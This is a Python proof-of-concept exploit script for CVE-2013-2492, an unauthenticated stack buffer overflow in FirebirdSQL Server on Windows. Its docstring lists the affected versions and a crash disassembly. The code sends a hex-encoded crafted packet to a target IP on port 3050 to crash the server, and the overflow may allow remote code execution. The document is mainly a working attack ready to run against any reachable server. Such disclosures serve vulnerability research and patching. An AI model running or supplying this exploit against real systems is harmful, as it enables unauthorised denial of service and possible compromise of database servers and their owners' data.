#!/usr/bin/env python
"""
firebird_dos.py

Discovered: 1-31-2013
By: Spencer McIntyre (zeroSteiner)
    SecureState Research and Innovation Team
www.securestate.com


Background:
-----------
FirebirdSQL Server Remote Unauthenticated Stack Buffer Overflow

Details:
--------
The FirebirdSQL server is vulnerable to a stack buffer overflow that can be
triggered when an unauthenticated user sends a specially crafted packet.  The 
result can lead to remote code execution as the user which runs the FirebirdSQL
server.

Vulnerable Versions:
--------------------
Tested on FirebirdSQL Server on Windows 2.1.3-2.1.5 and 2.5.1-2.5.2
Vendor: FirebirdSQL
Site: http://www.firebirdsql.org/

Crash Demonstration
(Addresses on 2.1.3)

00522031   8BF1             MOV ESI,ECX
00522033   8B06             MOV EAX,DWORD PTR DS:[ESI]
00522035   8B50 08          MOV EDX,DWORD PTR DS:[EAX+8]
00522038   57               PUSH EDI
00522039   FFD2             CALL EDX

References:
-----------
CVE-2013-2492
Firebird Issue Tracker Key CORE-4058
"""

import sys
import socket

def main():
	if len(sys.argv) < 2:
		print '[-] Usage: ' + sys.argv[0] + ' [TARGET_IP]'
		return 0

	data_1 =  ""
	data_1 += "00000001000000130000000200000024"
	data_1 += "00000010433a5c746573745f66697265"
	data_1 += "626972640000000400000022"
	data_1 += "0510"
	data_1 += "41414141424242424343434344444444"
	data_1 += "05156c6f63616c"
	data_1 += "686f73742e6c6f63616c646f6d61696e"
	data_1 += "06000000000000090000000100000002"
	data_1 += "00000005000000020000000a00000001"
	data_1 += "000000020000000500000004ffff800b"
	data_1 += "00000001000000020000000500000006"
	data_1 += "000000010000000200000005"
	data_1 += "0000000800" 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 3050))
	s.send(data_1.decode('hex'))
	s.close()

if __name__ == '__main__':
	main()
